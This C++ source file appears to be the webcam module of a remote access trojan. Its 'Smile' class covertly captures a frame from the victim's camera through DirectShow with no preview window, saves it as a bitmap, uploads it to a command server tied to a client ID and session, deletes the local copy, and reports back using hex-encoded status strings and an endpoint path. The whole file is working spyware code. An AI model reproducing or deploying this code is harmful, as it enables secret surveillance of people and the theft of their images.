#include "Smile.h"
#include <atlimage.h>

HRESULT hr;
ICreateDevEnum* pDevEnum = NULL;
IEnumMoniker* pEnum = NULL;
IMoniker* pMoniker = NULL;
IPropertyBag* pPropBag = NULL;
IGraphBuilder* pGraph = NULL;
ICaptureGraphBuilder2* pBuilder = NULL;
IBaseFilter* pCap = NULL;
IBaseFilter* pSampleGrabberFilter = NULL;
ISampleGrabber* pSampleGrabber = NULL;
IBaseFilter* pNullRenderer = NULL;
IMediaControl* pMediaControl = NULL;
char* pBuffer = NULL;
HttpRequests WindowsHttpRequests;
UploadDownload uploadDownloadFilesFiles;

void Smile::CleanUp()
{
	if (pBuffer != NULL) delete[] pBuffer;
	if (pMediaControl != NULL) pMediaControl->Release();
	if (pNullRenderer != NULL) pNullRenderer->Release();
	if (pSampleGrabber != NULL) pSampleGrabber->Release();
	if (pSampleGrabberFilter != NULL)
		pSampleGrabberFilter->Release();
	if (pCap != NULL) pCap->Release();
	if (pBuilder != NULL) pBuilder->Release();
	if (pGraph != NULL) pGraph->Release();
	if (pPropBag != NULL) pPropBag->Release();
	if (pMoniker != NULL) pMoniker->Release();
	if (pEnum != NULL) pEnum->Release();
	if (pDevEnum != NULL) pDevEnum->Release();
	CoUninitialize();
}

bool Smile::CatchSmile(string fileName, PublicStructers::client clientInfo)
{
	// Capture settings
	int snapshot_delay = 2000;
	int show_preview_window = 0;
	int list_devices = 0;
	int device_number = 1;
	char device_name[100];

	// Other variables
	char char_buffer[100];
	// Intialise COM
	hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
	if (hr != S_OK)
	{
		CleanUp();
		return false;
	}
		

	// Create filter graph
	hr = CoCreateInstance(CLSID_FilterGraph, NULL,
		CLSCTX_INPROC_SERVER, IID_IGraphBuilder,
		(void**)&pGraph);
	if (hr != S_OK)
	{
		CleanUp();
		return false;
	}

	// Create capture graph builder.
	hr = CoCreateInstance(CLSID_CaptureGraphBuilder2, NULL,
		CLSCTX_INPROC_SERVER, IID_ICaptureGraphBuilder2,
		(void**)&pBuilder);
	if (hr != S_OK)
	{
		CleanUp();
		return false;
	}

	// Attach capture graph builder to graph
	hr = pBuilder->SetFiltergraph(pGraph);
	if (hr != S_OK)
	{
		CleanUp();
		return false;
	}

	// Create system device enumerator
	hr = CoCreateInstance(CLSID_SystemDeviceEnum, NULL,
		CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&pDevEnum));
	if (hr != S_OK)
	{
		CleanUp();
		return false;
	}

	// Video input device enumerator
	hr = pDevEnum->CreateClassEnumerator(
		CLSID_VideoInputDeviceCategory, &pEnum, 0);
	if (hr != S_OK)
	{
		CleanUp();
		return false;
	}


	int n = 0;
	if (list_devices != 0)
	{
		n = 0;
		while (1)
		{
			// Find next device
			hr = pEnum->Next(1, &pMoniker, NULL);
			if (hr == S_OK)
			{
				// Increment device counter
				n++;
				// Get device name
				hr = pMoniker->BindToStorage(0, 0, IID_PPV_ARGS(&pPropBag));
				VARIANT var;
				VariantInit(&var);
				hr = pPropBag->Read(L"FriendlyName", &var, 0);
				VariantClear(&var);
			}
			else		
			{
				CleanUp();
				return false;
			}
		}
	}

	VARIANT var;
	n = 0;
	while (1)
	{
		// Access next device
		hr = pEnum->Next(1, &pMoniker, NULL);
		if (hr == S_OK)
			n++;
		else
		{
			if (device_number == 0)
				std::cout << "Device not found" + string(device_name) << std::endl;
			CleanUp();
			return false;
		}

		if (device_number == 0)
		{
			hr = pMoniker->BindToStorage(0, 0, IID_PPV_ARGS(&pPropBag));
			if (hr == S_OK)
			{
				// Get current device name
				VariantInit(&var);
				hr = pPropBag->Read(L"FriendlyName", &var, 0);

				// Convert to a normal C string, i.e. char*
				sprintf(char_buffer, "%ls", var.bstrVal);
				VariantClear(&var);
				pPropBag->Release();
				pPropBag = NULL;

				// Exit loop if current device name matched devname
				if (strcmp(device_name, char_buffer) == 0) break;
			}
			else
			{
				cout << "Error cleaning up" << endl;
				CleanUp();
				return false;
			}
		}
		else if (n >= device_number) break;
	}

	hr = pMoniker->BindToStorage(0, 0, IID_PPV_ARGS(&pPropBag));
	VariantInit(&var);
	hr = pPropBag->Read(L"FriendlyName", &var, 0);
	fprintf(stderr, "Capture device: %ls\n", var.bstrVal);
	VariantClear(&var);

	hr = pMoniker->BindToObject(0, 0,
		IID_IBaseFilter, (void**)&pCap);
	if (hr != S_OK)
	{
		CleanUp();
		return false;
	}

	// Add capture filter to graph
	hr = pGraph->AddFilter(pCap, L"Capture Filter");
	if (hr != S_OK)
	{
		CleanUp();
		return false;
	}

	hr = CoCreateInstance(CLSID_SampleGrabber, NULL,
		CLSCTX_INPROC_SERVER, IID_IBaseFilter,
		(void**)&pSampleGrabberFilter);
	if (hr != S_OK)
		CleanUp();

	hr = pSampleGrabberFilter->QueryInterface(
		IID_ISampleGrabber, (void**)&pSampleGrabber);
	if (hr != S_OK)
	{
		CleanUp();
		return false;
	}

	hr = pSampleGrabber->SetBufferSamples(TRUE);
	if (hr != S_OK)
	{
		CleanUp();
		return false;
	}

	AM_MEDIA_TYPE mt;
	ZeroMemory(&mt, sizeof(AM_MEDIA_TYPE));
	mt.majortype = MEDIATYPE_Video;
	mt.subtype = MEDIASUBTYPE_RGB24;
	hr = pSampleGrabber->SetMediaType((_AMMediaType*)&mt);
	if (hr != S_OK)
	{
		CleanUp();
		return false;
	}

	hr = pGraph->AddFilter(pSampleGrabberFilter, L"SampleGrab");
	if (hr != S_OK)
	{
		CleanUp();
		return false;
	}

	hr = CoCreateInstance(CLSID_NullRenderer, NULL,
		CLSCTX_INPROC_SERVER, IID_IBaseFilter,
		(void**)&pNullRenderer);
	if (hr != S_OK)
	{
		CleanUp();
		return false;
	}

	hr = pGraph->AddFilter(pNullRenderer, L"NullRender");
	if (hr != S_OK)
	{
		CleanUp();
		return false;
	}

	hr = pBuilder->RenderStream(
		&PIN_CATEGORY_CAPTURE, &MEDIATYPE_Video,
		pCap, pSampleGrabberFilter, pNullRenderer);
	if (hr != S_OK)
	{
		CleanUp();
		return false;
	}

	if (show_preview_window > 0)
	{
		hr = pBuilder->RenderStream(
			&PIN_CATEGORY_PREVIEW, &MEDIATYPE_Video,
			pCap, NULL, NULL);
		if (hr != S_OK && hr != VFW_S_NOPREVIEWPIN)
		{
			CleanUp();
			return false;
		}
	}

	hr = pGraph->QueryInterface(IID_IMediaControl,
		(void**)&pMediaControl);
	if (hr != S_OK)
	{
		CleanUp();
		return false;
	}

	while (1)
	{
		hr = pMediaControl->Run();
		if (hr == S_OK) break;
		if (hr == S_FALSE) continue; 

		fprintf(stderr, "Error: %u\n", hr);
		CleanUp();
		return false;
	}

	long buffer_size = 0;
	while (1)
	{
	
		hr = pSampleGrabber->GetCurrentBuffer(&buffer_size, NULL);

		if (hr == S_OK && buffer_size != 0) break;

		if (hr != S_OK && hr != VFW_E_WRONG_STATE)
		{
			CleanUp();
			return false;
		}
	}

	// Stop the graph
	pMediaControl->Stop();

	// Allocate buffer for image
	pBuffer = new char[buffer_size];
	if (!pBuffer)
	{
		CleanUp();
		return false;
	}

	// Retrieve image data from sample grabber buffer
	hr = pSampleGrabber->GetCurrentBuffer(
		&buffer_size, (long*)pBuffer);
	if (hr != S_OK)
	{
		CleanUp();
		return false;
	}

	// Get the media type from the sample grabber filter
	hr = pSampleGrabber->GetConnectedMediaType(
		(_AMMediaType*)&mt);
	if (hr != S_OK)
	{
		CleanUp();
		return false;
	}

	// Retrieve format information
	VIDEOINFOHEADER* pVih = NULL;
	if ((mt.formattype == FORMAT_VideoInfo) &&
		(mt.cbFormat >= sizeof(VIDEOINFOHEADER)) &&
		(mt.pbFormat != NULL))
	{
		pVih = (VIDEOINFOHEADER*)mt.pbFormat;

		long cbBitmapInfoSize = mt.cbFormat - SIZE_PREHEADER;
		BITMAPFILEHEADER bfh;
		ZeroMemory(&bfh, sizeof(bfh));
		bfh.bfType = 'MB';
		bfh.bfSize = sizeof(bfh) + buffer_size + cbBitmapInfoSize;
		bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + cbBitmapInfoSize;

		HANDLE hf = CreateFile(Utils::s2ws(fileName).c_str(), GENERIC_WRITE,
			FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, 0, NULL);
		if (hf == INVALID_HANDLE_VALUE)
		{
			CleanUp();
			return false;
		}

		DWORD dwWritten = 0;
		WriteFile(hf, &bfh, sizeof(bfh), &dwWritten, NULL);
		WriteFile(hf, HEADER(pVih),
			cbBitmapInfoSize, &dwWritten, NULL);
		WriteFile(hf, pBuffer, buffer_size, &dwWritten, NULL);
		CloseHandle(hf);

		CImage image;
		HRESULT res = image.Load(Utils::s2ws(fileName).c_str());
		image.Save(Utils::s2ws(fileName).c_str());
	}
	else
	{
		CleanUp();
		return false;

	}

	// Free the format block
	if (mt.cbFormat != 0)
	{
		CoTaskMemFree((PVOID)mt.pbFormat);
		mt.cbFormat = 0;
		mt.pbFormat = NULL;
	}
	if (mt.pUnk != NULL)
	{
		mt.pUnk->Release();
		mt.pUnk = NULL;
	}

	CleanUp();
	return true;
}


void Smile::TakePictureAction(string fileName, PublicStructers::client clientInfo)
{
	string finalData = Encryptions::hexToAscii("4661696c656420746f206361707475726520696d616765");
	string fullPath = mainDirectory + "\\" + fileName;
	if (!CatchSmile(fullPath, clientInfo))
		WindowsHttpRequests.SendPostData(JsonFunctions::CreatePostJson(finalData), clientInfo.session, Encryptions::hexToAscii("2F746F6F6C2F726573706F6E73652F"), clientInfo.clientId);
	else 
	{
		if (!uploadDownloadFilesFiles.upload_to_server(fullPath, clientInfo))
			WindowsHttpRequests.SendPostData(JsonFunctions::CreatePostJson(finalData), clientInfo.session, Encryptions::hexToAscii("2F746F6F6C2F726573706F6E73652F"), clientInfo.clientId);
		else
		{
			Sleep(1000);
			finalData = Encryptions::hexToAscii("57656263616d20636170747572652073756363656564656421");
			if (!DeleteFileW(Utils::s2ws(fullPath).c_str())) {
				#ifdef _DEBUG
					Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
				#endif
					return;
			}
			WindowsHttpRequests.SendPostData(JsonFunctions::CreatePostJson(finalData), clientInfo.session, Encryptions::hexToAscii("2F746F6F6C2F726573706F6E73652F"), clientInfo.clientId);
		}
	}
}